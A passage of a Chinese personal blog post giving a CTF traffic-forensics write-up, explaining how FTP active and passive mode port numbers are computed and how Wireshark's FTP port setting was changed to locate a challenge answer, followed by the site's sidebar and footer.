+<h5 id="坑点一"><a href="#坑点一" class="headerlink" title="坑点一"></a>坑点一</h5><p>关卡<code>14</code>的正确方法解题模式<br>这里介绍两种方法，一种是按tcp端口过滤，另一种是在<code>wireshark</code>中改变ftp端口号。<br>第一种方法：<br>先介绍下<code>FTP</code>的连接模式：其有两种方式，<code>PORT</code>（主动模式）和<code>PASV</code>（被动模式），均是相对于服务器而言的。<br>一、以<code>PORT</code>模式连接服务器的情况。其中在<code>LOG</code>里有这样的记录：<br><code>PORT 127,0,0,1,28,37</code>告诉服务器当收到这个<code>PORT</code>指令后，连接<code>FTP</code>客户的<code>28x256+37=7205</code>这个端口<br><code>Accepting connection: 127.0.0.1:20</code> 表示服务器接到指令后用<code>20</code>端口连接<code>7205</code>端口，而且被<code>FTP</code>客户接受。<br>二、以PASV模式连接服务器，连接LOG里有这样几句话：<br><code>227 Entering Passive Mode (127,0,0,1,26,80)</code>.代表客户机使用<code>PASV</code>模式连接服务器的<code>26x256+80=6736</code>端口。（当然服务器要支持这种模式）<br><code>125 Data connection already open; Transfer starting.</code>说明服务器的这个端口可用，返回ACK信息。</p>
+<p>两者的计算方式其实是一样的。（之前以为是两种不同的计算方式，经大佬们的提醒后修正）</p>
+<p>而在最后一个流量包中，又仔细分析了下，发现有两种：<br>第一种是<code>227 Entering Passive Mode (192,168,2,108,39,78).</code>如图：<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3440594870.png" alt="clipboard (3440594870.png).png"><br>第二种是<code>227 Entering Passive Mode (192,168,2,108,39,79).</code>如图<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/4195715713.png" alt="clipboard (4195715713.png).png"><br>按照上面的说法，两者都是<code>ftp</code>以<code>PASV</code>模式连接服务器，按照计算公式依次计算为:<br><code>39*256+78=10062</code><br><code>39*256+79=10063</code><br>发现<code>tcp</code>存在这两个端口，并在<code>10062</code>端口中找到了正确的关卡<code>14</code>的答案。<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1218808977.png" alt="clipboard (1218808977.png).png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3075863408.png" alt="clipboard (3075863408.png).png"><br>相关链接：<br><a href="https://blog.csdn.net/chary8088/article/details/1538573" target="_blank" rel="noopener">https://blog.csdn.net/chary8088/article/details/1538573</a>（这个链接里面讲到的内容可能有误，建议看下面的链接）<br><a href="https://blog.csdn.net/bestone0213/article/details/41892921" target="_blank" rel="noopener">https://blog.csdn.net/bestone0213/article/details/41892921</a><br>第二种方法：<br>在做题过程中，我们知道了<code>ftp</code>服务器放到了<code>1433</code>端口，<code>wireshark</code>中设置一波就行：<code>编辑-&gt;首选项-&gt;Protocols-&gt;ftp</code>,修正下端口号即可，然后再过滤语句<code>ftp-data</code>一番，查看其中的分组即可（这次栽在这个点了，说来说去经验不足，这个思路没想过，说明这个知识点应用的不够多）<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/13103930.png" alt="46465.png"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/3866312784.png" alt="123165.png"><br>额。。。。。这个点算是搞定了，要去看看<code>ftp</code>咯。</p>
+<h5 id="坑点二"><a href="#坑点二" class="headerlink" title="坑点二"></a>坑点二</h5><p>比赛的时候，在第七个数据包中发现存在一个<code>ELF</code>文件，不知道这干嘛的？（那时候还以为是要我搞<code>pwn</code>）请大佬们指教？<br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/1559655328.png" alt="clipboard"><br><img src="/2018/05/11/2018-05-11第七赛区铁人三项赛-赛后writeup/411242816.png" alt="clipboard"></p>
+<p>这干啥的呢？</p>
+<p>数据赛到此为止。先去找找相应的知识点补补。企业赛和个人赛得缓缓。写下这篇文章，废话较多，主要是留给学弟学妹和初学者们，还望大佬们多多指教。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/线下赛事/" rel="tag"># 线下赛事</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/11/26/2017黑盾杯赛后总结/" rel="next" title="2017黑盾杯赛后总结">
+                <i class="fa fa-chevron-left"></i> 2017黑盾杯赛后总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/08/12/hello-world/" rel="prev" title="博客正式上新 2018.08.12">
+                博客正式上新 2018.08.12 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/person_image.jpg"
+                alt="jianghuxia" />
+            
+              <p class="site-author-name" itemprop="name">jianghuxia</p>
+              <p class="site-description motion-element" itemprop="description">Stay Hungry. Stay Foolish.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#题目简述"><span class="nav-number">1.</span> <span class="nav-text">题目简述</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解题过程"><span class="nav-number">2.</span> <span class="nav-text">解题过程</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#关卡01-03"><span class="nav-number">2.1.</span> <span class="nav-text">关卡01~03</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#关卡04-07"><span class="nav-number">2.2.</span> <span class="nav-text">关卡04~07</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#关卡09-10"><span class="nav-number">2.3.</span> <span class="nav-text">关卡09~10</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#关卡11-04"><span class="nav-number">2.4.</span> <span class="nav-text">关卡11~04</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#迷之坑点"><span class="nav-number">3.</span> <span class="nav-text">迷之坑点</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#坑点一"><span class="nav-number">3.1.</span> <span class="nav-text">坑点一</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#坑点二"><span class="nav-number">3.2.</span> <span class="nav-text">坑点二</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">jianghuxia</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":160},"mobile":{"show":true}});</script></body>
+</html>
